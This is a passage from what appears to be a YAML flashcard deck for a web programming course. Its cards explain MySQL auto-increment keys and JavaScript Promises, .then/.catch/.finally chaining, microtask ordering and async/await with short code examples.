              XAMPP bundles MySQL and phpMyAdmin. Start MySQL in the XAMPP control panel, click Admin, and phpMyAdmin
              opens.
            example: "In phpMyAdmin: click New → name the database → create a table → paste SQL in the SQL tab → press GO."
          - id: nodejs-db-connect-card-06
            type: predict
            source: Slide 7
            bloom: understand
            prompt: >-
              A patient table declares patientid INT NOT NULL AUTO_INCREMENT PRIMARY KEY. An INSERT omits patientid
              entirely. What happens?
            answer: >-
              MySQL assigns the next unique integer automatically. The insert succeeds and result.insertId holds the
              generated value.
            explanation: >-
              AUTO_INCREMENT removes the need to supply primary key values manually. The database engine increments and
              assigns the key on every insert.
            example: INSERT INTO patient (name) VALUES ('Ada Lovelace') — patientid assigned by MySQL, not specified.
            lang: sql
  - id: m5-promises-async-programming
    name: Promises and Async Programming
    topics:
      - id: promises-basics
        name: "Promise object: constructor, executor, resolve/reject, pending/fulfilled/rejected states"
        tags:
          - promises
          - resolve
          - reject
          - pending
          - fulfilled
          - rejected
          - executor
        prose: >-
          A Promise is a JavaScript object representing an eventual value. The executor function runs eagerly on
          construction, synchronously calling resolve or reject to settle the Promise. Settlement is final and exclusive
          — the first of resolve or reject that fires wins; subsequent calls are ignored. .then() handlers are
          microtasks: they enqueue when the Promise is settled and run only after the current synchronous call stack
          empties.
        cards:
          - id: promises-basics-card-01
            type: cloze
            source: Slide 6 (Slide 19)
            bloom: remember
            prompt: >-
              A Promise executor runs {{eagerly}}: it executes synchronously at the moment `new Promise(executor)` is
              called, before any following statement.
            answer: eagerly
            explanation: >-
              The executor is not deferred. It runs on the current call stack, immediately on construction. Any
              console.log inside the executor prints before subsequent synchronous lines outside the Promise.
            example: |
              new Promise((resolve) => {
                console.log('A'); // prints first — eager executor
                resolve('B');
              });
              console.log('C'); // prints second — sync, after executor
              // Output: A, C  (then 'B' via .then if attached)
          - id: promises-basics-card-02
            type: name
            source: Slide 6 (Slides 13–14)
            bloom: remember
            prompt: What is the initial state of every Promise when it is first constructed?
            answer: pending
            explanation: >-
              Every Promise starts in the pending state. It stays pending until resolve() transitions it to fulfilled,
              or reject() transitions it to rejected. If neither is ever called, it remains pending forever.
            example: |
              let p = new Promise((resolve, reject) => {
                console.log('executor ran'); // resolve/reject never called
              });
              // p.[[PromiseState]] === 'pending' — forever
          - id: promises-basics-card-03
            type: cloze
            source: Slide 6 (Slide 17), ISAQuiz8 Q3
            bloom: understand
            prompt: >-
              Once a Promise is settled, calling `resolve()` or `reject()` again {{has no effect}}; the state never
              changes a second time.
            answer: has no effect
            explanation: >-
              Settlement is final. The state machine has no reverse transition. Only the first call to resolve or reject
              that exits the pending state counts; all subsequent calls are silently ignored.
            example: |
              let p = new Promise((resolve, reject) => {
                reject('3');   // settles: rejected
                resolve('4'); // ignored — already settled
              });
              p.then(null, (r) => console.log(r)); // logs '3', never '4'
          - id: promises-basics-card-04
            type: predict
            lang: js
            source: ISAQuiz8 Q3, Slide 6 (Slide 17)
            bloom: apply
            prompt: |
              What is the exact console output of this code? Explain why each line prints when it does.
              ```js
              let promise = new Promise(function(resolve, reject) {
                console.log('2');
                reject('3');
                resolve('4');
                console.log('5');
              });
              promise.then(
                (v) => console.log(v),
                (r) => console.log(r)
              );
              console.log('1');
              ```
            answer: 2, 5, 1, 3
            explanation: >-
              '2' and '5' print synchronously inside the eager executor. reject('3') settles the Promise and enqueues
              the rejection handler as a microtask; resolve('4') is ignored. '1' prints synchronously after the
              executor. When the call stack empties, the microtask queue drains: the rejection handler logs '3'. '4'
              never appears.
            example: |
              // Execution order:
              // 1. Executor runs (sync): logs 2, enqueues reject handler, ignores resolve, logs 5
              // 2. promise.then() registers handlers (rejection handler already queued)
              // 3. console.log('1') runs sync
              // 4. Stack empties → microtask: rejection handler logs 3
              // '4' is never logged
          - id: promises-basics-card-05
            type: predict
            lang: js
            source: Slide 6 (Slide 25), ISAQuiz8
            bloom: apply
            prompt: |
              What is the output? Explain why `1` does not print first.
              ```js
              Promise.resolve().then(() => console.log(1));
              console.log(2);
              ```
            answer: 2, 1
            explanation: >-
              Promise.resolve() returns an already-fulfilled Promise, but .then() still enqueues the callback as a
              microtask — it does not run synchronously. console.log(2) is synchronous and runs before the microtask
              queue drains.
            example: |
              // Even an already-fulfilled Promise sends .then() to the microtask queue.
              // Sync always runs before microtasks.
          - id: promises-basics-card-06
            type: cloze
            source: Slide 6 (Slide 18)
            bloom: understand
            prompt: >-
              Calling `resolve(value)` changes the Promise state to {{fulfilled}} and stores `value`; the `.then()`
              handler receives that value when the {{microtask queue}} drains.
            answer: fulfilled; microtask queue
            explanation: >-
              resolve() performs a synchronous state transition but defers the handler. The handler is placed in the
              microtask queue and runs only after the current call stack empties — not inline with resolve().
            example: |
              new Promise((resolve) => {
                resolve(42);          // state → fulfilled (sync)
                console.log('after'); // still runs — handler not fired yet
              }).then((v) => console.log(v)); // microtask: logs 42 after stack empties
          - id: promises-basics-card-07
            type: name
            source: Slide 6 (Slide 35)
            bloom: remember
            prompt: >-
              What is the collective term for a Promise that has exited the pending state, whether fulfilled or
              rejected?
            answer: settled
            explanation: >-
              A Promise is settled when it is either fulfilled or rejected. 'Settled' is not a third state — it is a
              label for any non-pending Promise. Do not use 'resolved' as a synonym for settled.
            example: |
              // fulfilled → settled
              // rejected  → settled
              // pending   → NOT settled
      - id: promise-chaining
        name: .then() Chaining, .catch(), and .finally()
        tags:
          - then
          - catch
          - finally
          - chaining
          - microtask-queue
        prose: >-
          .then() returns a new Promise — that is why chaining works. Returning a value from a .then() callback fulfills
          the next Promise with that value. Throwing rejects it and skips to the nearest .catch(). .finally() runs on
          any settled outcome but receives no value. Microtask callbacks (.then(), .catch()) drain completely before any
          setTimeout fires.
        cards:
          - id: promise-chaining-card-01
            type: name
            source: Slide 6 (Slide 26)
            bloom: remember
            prompt: What does calling .then() on a Promise always return?
            answer: A new Promise.
            explanation: >-
              .then() producing a new Promise is the mechanism that makes chaining possible. Each link in the chain is a
              distinct Promise object.
            example: |
              Promise.resolve(1).then(n => n * 2); // returns a new Promise fulfilled with 2
          - id: promise-chaining-card-02
            type: cloze
            source: Slide 6 (Slide 31)
            bloom: remember
            prompt: >-
              Inside a .then() callback, returning a plain value {{fulfills}} the next Promise, while throwing an error
              {{rejects}} it.
            answer: fulfills; rejects
            explanation: >-
              The two exit paths from a .then() callback determine the state of the Promise that .then() returned:
              return → fulfilled, throw → rejected.
            example: |
              .then(n => { return n * 3; })        // fulfills next Promise with n*3
              .then(n => { throw new Error(); })   // rejects next Promise
          - id: promise-chaining-card-03
            type: name
            source: Slide 6 (Slide 46)
            bloom: understand
            prompt: What is .catch(fn) equivalent to in terms of .then()?
            answer: .then(undefined, fn)
            explanation: >-
              .catch() is syntactic sugar. It registers fn as the rejection handler only, passing undefined as the
              fulfillment handler.
            example: |
              promise.catch(err => console.log(err));
              // same as:
              promise.then(undefined, err => console.log(err));
          - id: promise-chaining-card-04
            type: name
            source: Slide 6 (Slides 48–49)
            bloom: understand
            prompt: What argument does the .finally() callback receive?
            answer: No argument — it is called with undefined.
            explanation: >-
              .finally() runs on any settled outcome but is not passed the fulfilled value or rejection reason. The
              chain passes the original value through unchanged.
            example: |
              Promise.resolve(42)
                .finally(val => console.log(val)) // logs: undefined
                .then(val => console.log(val));   // logs: 42
          - id: promise-chaining-card-05
            type: predict
            lang: js
            source: ISAQuiz9 Q3
            bloom: apply
            prompt: |
              Predict the console output order:
              ```js
              setTimeout(() => console.log('setTimeout1'), 0);
              Promise.resolve()
                .then(() => console.log('then1'))
                .then(() => console.log('then2'));
              setTimeout(() => console.log('setTimeout2'), 0);
              ```
            answer: then1, then2, setTimeout1, setTimeout2
            explanation: >-
              .then() callbacks are microtasks. The microtask queue drains completely before any macrotask (setTimeout)
              fires. Both .then() callbacks run before either setTimeout callback, regardless of registration order.
            example: |
              // Output:
              // then1
              // then2
              // setTimeout1
              // setTimeout2
          - id: promise-chaining-card-06
            type: cloze
            source: Slide 6 (Slide 29), ISAQuiz9 Q4–Q5
            bloom: apply
            prompt: >-
              A throw inside a .then() callback causes the chain to skip all subsequent .then() calls until it reaches
              the nearest downstream {{.catch()}}. After .catch() handles the error and returns a value, the chain
              resumes as {{fulfilled}}.
            answer: .catch(); fulfilled
            explanation: >-
              Error propagation through a chain mirrors try/catch blocks: throw = reject, .catch() = catch block.
              Returning from .catch() resumes the fulfilled path.
            example: |
              Promise.resolve('ok')
                .then(() => { throw new Error('oops'); })
                .then(() => console.log('skipped'))   // never runs
                .catch(err => { return 'recovered'; })
                .then(val => console.log(val));        // recovered
          - id: promise-chaining-card-07
            type: predict
            lang: js
            source: ISAQuiz9 Q10, Slide 6 (Slide 48)
            bloom: analyze
            prompt: |
              Predict what `.finally()` logs:
              ```js
              Promise.resolve('hello')
                .finally(val => {
                  console.log('finally:', val);
                });
              ```
            answer: "finally: undefined"
            explanation: >-
              .finally() receives no argument. The val parameter is undefined regardless of the upstream fulfilled
              value. The original fulfilled value ('hello') passes through to any downstream .then() unchanged.
            example: |
              // Output: finally: undefined
      - id: async-await
        name: async/await syntax, relationship to promises, async function return type
        tags:
          - async
          - await
          - promise
          - syntax
        prose: >-
          async/await is syntactic sugar over Promises. An async function always returns a Promise wrapping its return
          value. await pauses the async function — not the thread — until the awaited Promise settles, then resumes with
          the fulfilled value or throws on rejection. Omitting await when calling a Promise-returning function is a
          common silent bug that yields a Promise object instead of the resolved value.
        cards:
          - id: async-await-card-01
            type: cloze
            source: Slide 9 (Slide 3)
            bloom: remember
            prompt: An async function always returns a {{Promise}}.
            answer: Promise
            explanation: >-
              The async keyword wraps the function's return value in Promise.resolve(), so every invocation produces a
              Promise regardless of what the body returns.
            example: |
              async function greet() { return "Hello"; }
              // greet() returns Promise<"Hello">, not the string directly
          - id: async-await-card-02
            type: name
            source: ISAQuiz8 Q11
            bloom: remember
            prompt: What JavaScript type does an async function return upon invocation?
            answer: object (a Promise is an object)
            explanation: >-
              typeof on a Promise yields "object". ISAQuiz8 Q11 tests exactly this: the return type of an async function
              invocation is object, because Promises are objects.
            example: |
              async function foo() { return 42; }
              typeof foo(); // "object" — it's a Promise
          - id: async-await-card-03
            type: cloze
            source: Slide 9 (Slide 52)
            bloom: understand
            prompt: async/await is syntactic sugar over {{Promises}}; every await is equivalent to a {{.then()}} callback.
            answer: Promises; .then()
            explanation: >-
              await expr desugars to expr.then(value => /* rest of function */). The underlying Promise and
              microtask-queue mechanics are unchanged.
            example: |
              // These are equivalent:
              const val = await somePromise;
              somePromise.then(val => { /* rest */ });
          - id: async-await-card-04
            type: predict
            lang: js
            source: Slide 9 (Slide 3)
            bloom: apply
            prompt: |
              Predict the output:
              ```js
              async function double(n) { return n * 2; }
              const result = double(5);
              console.log(result);
              ```
            answer: Logs a Promise object, not 10.
            explanation: >-
              double(5) returns a Promise, not the number 10. To get 10, you need: double(5).then(v => console.log(v))
              or await double(5) inside an async function.
            example: |
              // Fix:
              async function main() {
                const result = await double(5);
                console.log(result); // 10
              }
          - id: async-await-card-05
            type: predict
            lang: js
            source: Slide 9 (Slide 52)
            bloom: apply
            prompt: |
              Predict what happens:
              ```js
              function load() {
                const data = await fetch("/api");
                return data;
              }
              ```
            answer: SyntaxError — await is only valid inside an async function.
            explanation: >-
              await cannot appear in a non-async function. The fix is to declare load() as async function load().
              Omitting async when using await is caught at parse time.
            example: |
              // Fix:
              async function load() {
                const data = await fetch("/api");
                return data;
              }
          - id: async-await-card-06
            type: name
            source: Slide 9 (Slide 5)
            bloom: understand
            prompt: Does await block the JavaScript thread?
            answer: No — it pauses the async function only; other code continues on the thread.
            explanation: >-
              await suspends the async function and schedules its continuation on the microtask queue. The event loop
              remains free to run other callbacks while the function is paused.
            example: |
              async function slow() {
                await delay(1000); // pauses slow(), not the thread
              }
              slow();
              console.log("runs immediately — thread not blocked");
